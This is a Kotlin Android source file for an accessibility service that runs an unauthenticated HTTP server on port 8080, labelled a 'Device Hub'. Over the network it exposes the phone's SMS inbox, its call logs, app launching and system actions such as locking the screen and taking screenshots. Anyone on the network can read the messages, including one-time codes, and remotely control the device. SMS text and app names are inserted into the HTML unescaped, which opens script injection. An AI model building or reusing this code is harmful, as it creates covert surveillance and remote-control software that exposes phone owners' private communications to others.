package com.example.devicemanager

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.provider.CallLog
import android.view.accessibility.AccessibilityEvent
import fi.iki.elonen.NanoHTTPD
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class RemoteControlService : AccessibilityService() {

    private var server: WebServer? = null

    companion object {
        var instance: RemoteControlService? = null
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        try {
            if (server == null) {
                server = WebServer(8080)
                server?.start()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        server?.stop()
        instance = null
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {}
    override fun onInterrupt() {}

    private fun getSmsHtml(): String {
        val sb = StringBuilder()
        try {
            val cursor = contentResolver.query(
                Uri.parse("content://sms/inbox"),
                arrayOf("address", "body", "date"),
                null,
                null,
                "date DESC LIMIT 40"
            )
            cursor?.use {
                val addrIdx = it.getColumnIndex("address")
                val bodyIdx = it.getColumnIndex("body")
                val dateIdx = it.getColumnIndex("date")
                while (it.moveToNext()) {
                    val address = it.getString(addrIdx) ?: "Unknown"
                    val body = it.getString(bodyIdx) ?: ""
                    val date = SimpleDateFormat("dd MMM, HH:mm", Locale.getDefault()).format(Date(it.getLong(dateIdx)))
                    sb.append("<div class='card'><b>From: ").append(address).append("</b><small style='float:right'>")
                      .append(date).append("</small><p>").append(body).append("</p></div>")
                }
            }
        } catch (e: Exception) {
            return "<div class='card'><p>Error reading SMS: ${e.message}</p></div>"
        }
        return if (sb.isEmpty()) "<div class='card'><p>No SMS found in inbox.</p></div>" else sb.toString()
    }

    private fun getCallLogsHtml(): String {
        val sb = StringBuilder()
        try {
            val cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION),
                null,
                null,
                CallLog.Calls.DATE + " DESC LIMIT 40"
            )
            cursor?.use {
                val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
                val nameIdx = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                val durIdx = it.getColumnIndex(CallLog.Calls.DURATION)
                while (it.moveToNext()) {
                    val number = it.getString(numIdx) ?: "Unknown"
                    val name = it.getString(nameIdx) ?: number
                    val type = when (it.getInt(typeIdx)) {
                        CallLog.Calls.INCOMING_TYPE -> "Incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                        CallLog.Calls.MISSED_TYPE -> "Missed"
                        else -> "Call"
                    }
                    val date = SimpleDateFormat("dd MMM, HH:mm", Locale.getDefault()).format(Date(it.getLong(dateIdx)))
                    val duration = it.getString(durIdx) ?: "0"
                    sb.append("<div class='card'><b>").append(name).append(" (").append(type).append(")</b>")
                      .append("<small style='float:right'>").append(date).append("</small><p>")
                      .append(number).append(" | Duration: ").append(duration).append("s</p></div>")
                }
            }
        } catch (e: Exception) {
            return "<div class='card'><p>Error reading call logs: ${e.message}</p></div>"
        }
        return if (sb.isEmpty()) "<div class='card'><p>No call logs found.</p></div>" else sb.toString()
    }

    inner class WebServer(port: Int) : NanoHTTPD(port) {
        override fun serve(session: IHTTPSession): Response {
            val uri = session.uri
            val params = session.parameters

            // Global Actions (Back, Home, Recents, Lock, Screenshot)
            if (uri == "/key") {
                val action = params["action"]?.firstOrNull()
                val success = when (action) {
                    "back" -> performGlobalAction(GLOBAL_ACTION_BACK)
                    "home" -> performGlobalAction(GLOBAL_ACTION_HOME)
                    "recents" -> performGlobalAction(GLOBAL_ACTION_RECENTS)
                    "lock" -> performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)
                    "screenshot" -> performGlobalAction(GLOBAL_ACTION_TAKE_SCREENSHOT)
                    else -> false
                }
                return newFixedLengthResponse(if (success) "Action executed" else "Action failed")
            }

            if (uri == "/launch") {
                val pkg = params["pkg"]?.firstOrNull()
                if (!pkg.isNullOrEmpty()) {
                    val intent = packageManager.getLaunchIntentForPackage(pkg)?.apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                    }
                    if (intent != null) {
                        startActivity(intent)
                        return newFixedLengthResponse("Launched $pkg")
                    }
                    return newFixedLengthResponse("Failed: Launch intent null")
                }
            }

            if (uri == "/api/sms") return newFixedLengthResponse(Response.Status.OK, "text/html", getSmsHtml())
            if (uri == "/api/calls") return newFixedLengthResponse(Response.Status.OK, "text/html", getCallLogsHtml())

            val pm = packageManager
            val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)
                .filter { pm.getLaunchIntentForPackage(it.packageName) != null }
                .sortedBy { it.loadLabel(pm).toString() }

            val appsHtml = StringBuilder()
            for (app in packages) {
                val name = app.loadLabel(pm).toString()
                val pkg = app.packageName
                appsHtml.append("<li><span><b>").append(name).append("</b><br><small>").append(pkg)
                        .append("</small></span><button onclick=\"launchApp('").append(pkg)
                        .append("')\">Open</button></li>")
            }

            val html = """
                <!DOCTYPE html>
                <html>
                <head>
                    <meta name="viewport" content="width=device-width, initial-scale=1">
                    <title>Device Hub</title>
                    <style>
                        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #121212; color: #fff; margin: 0; padding: 16px; }
                        .nav-bar { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 16px; background: #1e1e1e; padding: 10px; border-radius: 8px; }
                        button { background: #2563eb; color: #fff; border: none; border-radius: 6px; padding: 10px 14px; font-weight: bold; cursor: pointer; }
                        .btn-screenshot { background: #059669; }
                        .tab-btn { background: #2d2d2d; flex: 1; text-align: center; }
                        .active { background: #2563eb !important; }
                        .card { background: #1e1e1e; padding: 12px; margin: 8px 0; border-radius: 8px; border-left: 4px solid #2563eb; }
                        ul { list-style: none; padding: 0; margin: 0; }
                        li { background: #1e1e1e; padding: 12px; margin: 8px 0; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; }
                        .tab-pane { display: none; }
                        .show { display: block; }
                        #toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: #333; color: #fff; padding: 10px 18px; border-radius: 20px; display: none; font-size: 14px; }
                    </style>
                </head>
                <body>
                    <div class="nav-bar">
                        <button onclick="sendKey('back')">Back</button>
                        <button onclick="sendKey('home')">Home</button>
                        <button onclick="sendKey('recents')">Recents</button>
                        <button class="btn-screenshot" onclick="sendKey('screenshot')">Screenshot</button>
                        <button onclick="sendKey('lock')" style="background:#dc2626;">Lock</button>
                    </div>

                    <div style="display:flex; gap:8px; margin-bottom:16px;">
                        <button class="tab-btn active" onclick="switchTab('apps', this)">Apps</button>
                        <button class="tab-btn" onclick="loadTab('sms', this)">Messages</button>
                        <button class="tab-btn" onclick="loadTab('calls', this)">Calls</button>
                    </div>

                    <div id="apps" class="tab-pane show">
                        <ul>$appsHtml</ul>
                    </div>

                    <div id="sms" class="tab-pane">Loading messages...</div>
                    <div id="calls" class="tab-pane">Loading call logs...</div>

                    <div id="toast"></div>

                    <script>
                        function showToast(text) {
                            const toast = document.getElementById('toast');
                            toast.innerText = text;
                            toast.style.display = 'block';
                            setTimeout(() => { toast.style.display = 'none'; }, 2000);
                        }

                        function sendKey(action) {
                            fetch('/key?action=' + action)
                                .then(r => r.text())
                                .then(msg => showToast(action.toUpperCase() + ': ' + msg))
                                .catch(err => showToast('Error: ' + err));
                        }

                        function switchTab(id, elem) {
                            document.querySelectorAll('.tab-pane').forEach(el => el.classList.remove('show'));
                            document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
                            document.getElementById(id).classList.add('show');
                            elem.classList.add('active');
                        }

                        function loadTab(id, elem) {
                            switchTab(id, elem);
                            fetch('/api/' + id)
                                .then(r => r.text())
                                .then(html => { document.getElementById(id).innerHTML = html; })
                                .catch(err => { document.getElementById(id).innerHTML = '<p>Failed to load data: ' + err + '</p>'; });
                        }

                        function launchApp(pkg) {
                            fetch('/launch?pkg=' + pkg)
                                .then(r => r.text())
                                .then(msg => showToast(msg));
                        }
                    </script>
                </body>
                </html>
            """.trimIndent()

            return newFixedLengthResponse(Response.Status.OK, "text/html", html)
        }
    }
}
